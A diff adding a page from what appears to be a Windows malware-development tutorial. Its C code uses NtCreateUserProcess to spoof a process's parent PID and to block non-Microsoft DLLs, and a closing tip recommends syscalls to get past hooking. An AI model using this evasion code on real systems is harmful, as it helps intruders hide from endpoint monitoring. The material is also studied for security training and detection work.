+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#define TARGET_PROCESS          L&quot;\\??\\C:\\Windows\\System32\\RuntimeBroker.exe&quot;#define PROCESS_PARMS           L&quot;C:\\Windows\\System32\\RuntimeBroker.exe -Embedding&quot;#define PROCESS_PATH            L&quot;C:\\Windows\\System32&quot;#define PARENT_PID              4384int main() {
+
+  HANDLE	hProcess	= NULL,
+		    hThread		= NULL;
+
+  hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PARENT_PID);
+  if (!NtCreateUserProcessForPPidSpoofing(TARGET_PROCESS, PROCESS_PARMS, PROCESS_PATH, hParentProcess, &amp;hProcess, &amp;hThread))
+	return -1;
+
+  printf(&quot;[+] Target Process Created With Pid : %d \n&quot;, GetProcessId(hProcess));
+  printf(&quot;[+] Process&#x27;s Main Thread Created With Tid : %d \n&quot;, GetThreadId(hThread));
+  return 0;
+}</code></pre>
+        </div><h3 id="results" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Results</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The image below shows a process with a successfully spoofed parent process.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntcreateuserprocess-719850092-b93a1079-dfe7-4a3c-9db5-bc00c30df0b6.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="block-dll-policy-using-ntcreateuserprocess" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Block DLL Policy Using NtCreateUserProcess</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code> can also be used to enable the block DLL policy, which was introduced in the previous module. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PS_ATTRIBUTE_LIST</code> structure will require two attributes. The additional attribute is set to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PS_ATTRIBUTE_MITIGATION_OPTIONS</code> which specifies the process mitigation options to use for the new process.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcessForBlockDllPolicy</code> is a custom function that enables the mitigation policy to block non-Microsoft signed DLLs.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL NtCreateUserProcessForBlockDllPolicy(
+	IN      PWSTR   szTargetProcess,
+	IN      PWSTR   szTargetProcessParameters,
+	IN      PWSTR   szTargetProcessPath,
+	OUT     PHANDLE hProcess,
+	OUT     PHANDLE hThread
+) {
+
+	// getting the address of &#x27;RtlCreateProcessParametersEx&#x27; and &#x27;NtCreateUserProcess&#x27; from ntdll.dll
+	fnRtlCreateProcessParametersEx  RtlCreateProcessParametersEx    = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;RtlCreateProcessParametersEx&quot;);
+	fnNtCreateUserProcess           NtCreateUserProcess             = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;NtCreateUserProcess&quot;);
+
+	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
+		return FALSE;
+
+	NTSTATUS                        STATUS                      = NULL;
+	UNICODE_STRING                  UsNtImagePath               = { 0 },
+                                    UsCommandLine               = { 0 },
+                                    UsCurrentDirectory          = { 0 };
+	PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters        = NULL;
+	// the mitigation policy flag (attribute value)
+	DWORD64                         dwBlockDllPolicy            = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+	// allocating a buffer to hold the value of the attribute lists
+	PPS_ATTRIBUTE_LIST              pAttributeList              = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
+	if (!pAttributeList)
+		return FALSE;
+
+	// initializing the &#x27;UNICODE_STRING&#x27; structures with the inputted paths
+	_RtlInitUnicodeString(&amp;UsNtImagePath, szTargetProcess);
+	_RtlInitUnicodeString(&amp;UsCommandLine, szTargetProcessParameters);
+	_RtlInitUnicodeString(&amp;UsCurrentDirectory, szTargetProcessPath);
+
+	// calling &#x27;RtlCreateProcessParametersEx&#x27; to intialize a &#x27;PRTL_USER_PROCESS_PARAMETERS&#x27; structure for &#x27;NtCreateUserProcess&#x27;
+	STATUS = RtlCreateProcessParametersEx(&amp;UppProcessParameters, &amp;UsNtImagePath, NULL, &amp;UsCurrentDirectory, &amp;UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
+	if (STATUS != STATUS_SUCCESS) {
+		printf(&quot;[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		goto _EndOfFunc;
+	}
+
+	// setting the length of the attribute list
+	pAttributeList-&gt;TotalLength                     = sizeof(PS_ATTRIBUTE_LIST);
+
+	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_IMAGE_NAME&#x27; that specifies the image&#x27;s path
+	pAttributeList-&gt;Attributes[0].Attribute         = PS_ATTRIBUTE_IMAGE_NAME;
+	pAttributeList-&gt;Attributes[0].Size              = UsNtImagePath.Length;
+	pAttributeList-&gt;Attributes[0].Value             = (ULONG_PTR)UsNtImagePath.Buffer;
+
+	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_MITIGATION_OPTIONS&#x27; that specifies the use of process&#x27;s mitigation policies
+	pAttributeList-&gt;Attributes[1].Attribute         = PS_ATTRIBUTE_MITIGATION_OPTIONS;
+	pAttributeList-&gt;Attributes[1].Size              = sizeof(DWORD64);
+	pAttributeList-&gt;Attributes[1].Value             = &amp;dwBlockDllPolicy;
+
+	// creating the &#x27;PS_CREATE_INFO&#x27; structure, that will almost always look like this
+	PS_CREATE_INFO					psCreateInfo = {
+						.Size = sizeof(PS_CREATE_INFO),
+						.State = PsCreateInitialState
+	};
+
+
+	// creating the process
+	// hProcess and hThread are already pointers
+	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &amp;psCreateInfo, pAttributeList);
+	if (STATUS != STATUS_SUCCESS) {
+		printf(&quot;[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		goto _EndOfFunc;
+	}
+
+
+_EndOfFunc:
+	HeapFree(GetProcessHeap(), 0, pAttributeList);
+	if (*hProcess == NULL || *hThread == NULL)
+		return FALSE;
+	else
+		return TRUE;
+}</code></pre>
+        </div><h3 id="results" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Results</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Invoking <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcessForBlockDllPolicy</code> will result in the output below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntcreateuserprocess-819850671-388c86f6-beb3-4009-b03d-2854ea61312e.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="ppid-spoofing-and-block-dll-policy" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>PPID Spoofing And Block DLL Policy</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Finally, this section merges the two previous implementations into a single one by modifying the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PS_ATTRIBUTE_LIST</code> structure to accommodate an extra attribute and subsequently invoking the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcessForBoth</code> function as shown below. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PS_ATTRIBUTE_LIST</code> structure will require three attributes.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL NtCreateUserProcessForBoth(
+	IN      PWSTR   szTargetProcess,
+	IN      PWSTR   szTargetProcessParameters,
+	IN      PWSTR   szTargetProcessPath,
+	IN      HANDLE  hParentProcess,
+	OUT     PHANDLE hProcess,
+	OUT     PHANDLE hThread
+) {
+
+	// getting the address of &#x27;RtlCreateProcessParametersEx&#x27; and &#x27;NtCreateUserProcess&#x27; from ntdll.dll
+	fnRtlCreateProcessParametersEx  RtlCreateProcessParametersEx    = (fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;RtlCreateProcessParametersEx&quot;);
+	fnNtCreateUserProcess           NtCreateUserProcess             = (fnNtCreateUserProcess)GetProcAddress(GetModuleHandle(L&quot;NTDLL&quot;), &quot;NtCreateUserProcess&quot;);
+
+	if (NtCreateUserProcess == NULL || RtlCreateProcessParametersEx == NULL)
+		return FALSE;
+
+	NTSTATUS                        STATUS                      = NULL;
+	UNICODE_STRING                  UsNtImagePath               = { 0 },
+                                    UsCommandLine               = { 0 },
+                                    UsCurrentDirectory          = { 0 };
+	PRTL_USER_PROCESS_PARAMETERS    UppProcessParameters        = NULL;
+	// the mitigation policy flag (attribute value)
+	DWORD64                         dwBlockDllPolicy            = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+	// allocating a buffer to hold the value of the attribute lists
+	PPS_ATTRIBUTE_LIST              pAttributeList              = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
+	if (!pAttributeList)
+		return FALSE;
+
+	// initializing the &#x27;UNICODE_STRING&#x27; structures with the inputted paths
+	_RtlInitUnicodeString(&amp;UsNtImagePath, szTargetProcess);
+	_RtlInitUnicodeString(&amp;UsCommandLine, szTargetProcessParameters);
+	_RtlInitUnicodeString(&amp;UsCurrentDirectory, szTargetProcessPath);
+
+	// calling &#x27;RtlCreateProcessParametersEx&#x27; to intialize a &#x27;PRTL_USER_PROCESS_PARAMETERS&#x27; structure for &#x27;NtCreateUserProcess&#x27;
+	STATUS = RtlCreateProcessParametersEx(&amp;UppProcessParameters, &amp;UsNtImagePath, NULL, &amp;UsCurrentDirectory, &amp;UsCommandLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
+	if (STATUS != STATUS_SUCCESS) {
+		printf(&quot;[!] RtlCreateProcessParametersEx Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		goto _EndOfFunc;
+	}
+
+
+	// setting the length of the attribute list
+	pAttributeList-&gt;TotalLength                     = sizeof(PS_ATTRIBUTE_LIST);
+
+	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_IMAGE_NAME&#x27; that specifies the image&#x27;s path
+	pAttributeList-&gt;Attributes[0].Attribute         = PS_ATTRIBUTE_IMAGE_NAME;
+	pAttributeList-&gt;Attributes[0].Size              = UsNtImagePath.Length;
+	pAttributeList-&gt;Attributes[0].Value             = (ULONG_PTR)UsNtImagePath.Buffer;
+
+	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_MITIGATION_OPTIONS&#x27; that specifies the use of process&#x27;s mitigation policies
+	pAttributeList-&gt;Attributes[1].Attribute         = PS_ATTRIBUTE_MITIGATION_OPTIONS;
+	pAttributeList-&gt;Attributes[1].Size              = sizeof(DWORD64);
+	pAttributeList-&gt;Attributes[1].Value             = &amp;dwBlockDllPolicy;
+
+	// intializing an attribute list of type &#x27;PS_ATTRIBUTE_PARENT_PROCESS&#x27; that specifies the process&#x27;s parent
+	pAttributeList-&gt;Attributes[2].Attribute         = PS_ATTRIBUTE_PARENT_PROCESS;
+	pAttributeList-&gt;Attributes[2].Size              = sizeof(HANDLE);
+	pAttributeList-&gt;Attributes[2].Value             = hParentProcess;
+
+	// creating the &#x27;PS_CREATE_INFO&#x27; structure, that will almost always look like this
+	PS_CREATE_INFO				psCreateInfo	= {
+					.Size = sizeof(PS_CREATE_INFO),
+					.State = PsCreateInitialState
+	};
+
+	// creating the process
+	// hProcess and hThread are already pointers
+	STATUS = NtCreateUserProcess(hProcess, hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, UppProcessParameters, &amp;psCreateInfo, pAttributeList);
+	if (STATUS != STATUS_SUCCESS) {
+		printf(&quot;[!] NtCreateUserProcess Failed With Error : 0x%0.8X \n&quot;, STATUS);
+		goto _EndOfFunc;
+	}
+
+
+_EndOfFunc:
+	HeapFree(GetProcessHeap(), 0, pAttributeList);
+	if (*hProcess == NULL || *hThread == NULL)
+		return FALSE;
+	else
+		return TRUE;
+}</code></pre>
+        </div><h3 id="results" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Results</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Executing <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcessForBoth</code> with the right parameter will result in the following</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/ntcreateuserprocess-919850979-2cf51837-c6e8-448b-a038-ab24fb7007a0.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><h3 id="improving-the-implementation" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Improving The Implementation</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code> function was retrieved using <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetProcAddress</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetModuleHandle</code> for the sake of simplicity. However, in a real-world scenario, it is recommended to use direct or indirect syscalls in case <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtCreateUserProcess</code> is hooked.</p></li></main></body></html>
